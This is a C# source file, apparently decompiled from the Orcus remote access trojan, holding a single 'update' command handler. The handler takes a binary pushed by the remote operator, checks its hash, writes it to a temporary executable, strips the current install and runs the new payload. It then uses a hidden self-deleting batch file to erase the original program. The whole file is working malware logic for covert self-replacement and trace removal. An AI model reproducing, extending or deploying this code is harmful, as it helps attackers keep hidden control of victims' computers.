using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands;

public class UpdateCommandEx : UpdateCommand
{
	public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
	{
		byte[] first = commandParameter.get_Data().Take(32).ToArray();
		string freeTempFileName = FileExtensions.GetFreeTempFileName("exe");
		byte[] second;
		using (FileStream fileStream = new FileStream(freeTempFileName, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
		{
			fileStream.Write(commandParameter.get_Data(), 32, commandParameter.get_Data().Length - 32);
			fileStream.Position = 0L;
			using SHA256Managed sHA256Managed = new SHA256Managed();
			second = sHA256Managed.ComputeHash(fileStream);
		}
		if (!first.SequenceEqual(second))
		{
			File.Delete(freeTempFileName);
			feedbackFactory.Failed("The hash value of the file does not equal the transmitted hash value");
			return;
		}
		UninstallHelper.RemoveAllDependencies();
		UninstallHelper.RemoveOtherStuff();
		feedbackFactory.Succeeded();
		Program.Unload();
		try
		{
			string applicationPath = Consts.ApplicationPath;
			string freeTempFileName2 = FileExtensions.GetFreeTempFileName("bat");
			File.SetAttributes(applicationPath, FileAttributes.Normal);
			string contents = $"@ECHO OFF\r\nping 127.0.0.1 > nul\r\necho j | del \"{applicationPath}\"\r\necho j | del {applicationPath}";
			File.WriteAllText(freeTempFileName2, contents);
			ProcessStartInfo startInfo = new ProcessStartInfo(freeTempFileName2)
			{
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process.Start(freeTempFileName);
			Process.Start(startInfo);
		}
		catch (Exception)
		{
			Application.Restart();
			return;
		}
		Program.Exit();
	}
}
